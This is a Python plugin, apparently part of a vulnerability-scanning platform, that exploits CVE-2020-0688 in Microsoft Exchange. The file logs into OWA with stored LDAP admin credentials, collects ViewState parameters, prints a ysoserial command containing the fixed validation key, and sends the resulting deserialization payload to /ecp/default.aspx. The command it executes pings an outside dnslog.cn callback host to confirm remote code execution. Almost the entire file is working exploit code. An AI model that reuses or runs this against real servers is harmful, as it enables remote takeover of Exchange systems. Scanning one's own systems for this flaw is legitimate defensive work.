# cve-2020-0688  exchange漏洞，可测试对象比较少，而且需要登录的情况下，不开启
import requests
import readline
import argparse
import re
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
urllib3.disable_warnings()
from apps.assets.models import Risk, Port
from django.conf import settings
session = requests.Session()
from loguru import logger
from multiprocessing.dummy import Pool as ThreadPool

plugin = 'cve_2020_0688'


def get_value(url, user, pwd):
	logger.info("Tring to login owa...")
	tmp = urlparse(url)
	base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
	paramsPost = {"password": ""+pwd+"", "isUtf8": "1", "passwordText": "", "trusted": "4",
				"destination": ""+url+"", "flags": "4", "forcedownlevel": "0", "username": ""+user+""}
	headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0", "Connection": "close", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Cookie": "PrivateComputer=true; PBack=0"}
	cookies = {"PBack": "0", "PrivateComputer": "true"}
	login_url = base_url + '/owa/auth.owa'
	logger.info("[+] Login url: {}".format(login_url))
	try:
		login = session.post(login_url, data=paramsPost,
                          headers=headers, verify=False, timeout=5)
		logger.info("Status code:   %i" % login.status_code)
		if "reason=" in login.text or "reason=" in login.url and "owaLoading" in login.text:
			logger.info("[!] Login Incorrect, please try again with a different account..")
		logger.info("[+] Login successfully! ")
	except Exception as e:
		logger.info("[!] login error , error: {}".format(e))

	try:
		logger.info("Tring to get __VIEWSTATEGENERATOR...")
		target_url = "{}/ecp/default.aspx".format(base_url)
		new_response = session.get(target_url, verify=False, timeout=5)
		view = re.compile(
			'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(new_response.text))[0]
		logger.info("[+] Done! __VIEWSTATEGENERATOR:{}".format(view))
	except:
		view = "B97B4E27"
		logger.info("Can't get __VIEWSTATEGENERATOR, use default value: {}".format(view))
	try:
		logger.info("Tring to get ASP.NET_SessionId....")
		key = session.cookies['ASP.NET_SessionId']
		logger.info("[+] Done!  ASP.NET_SessionId: {}".format(key))
	except Exception as e:
		key = None
		logger.info("[!] Get ASP.NET_SessionId error, error: {} \n Exit..".format(e))
	return view, key, base_url


def start(**kwargs):
	webapps = kwargs['webapps']
	policy = kwargs['policy']
	user = settings.LDAP_ADMIN_USERNAME
	pwd = settings.LDAP_ADMIN_PASSWORD
	command = 'ping test.ph4nxq.dnslog.cn'
	for webapp in webapps:
		try:
			url = webapp.subdomain + '/owa'

			logger.debug("[%s] %s" % (plugin, url))
			view, key, base_url = get_value(url, user, pwd)
			if key is None:
				continue
			logger.info("""\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{}" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{}" --viewstateuserkey="{}" --isdebug –islegacy""".format(command,view,key))
			out_payload = input('\nPlease input ysoserial payload:')
			final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}".format(
				base_url, view, quote(out_payload))
			logger.info("\nExp url: {}".format(final_exp))
			logger.info("\nTrigger payload..")
			status = session.get(final_exp,verify=False)
			logger.info(status.status_code)
		except:
			pass


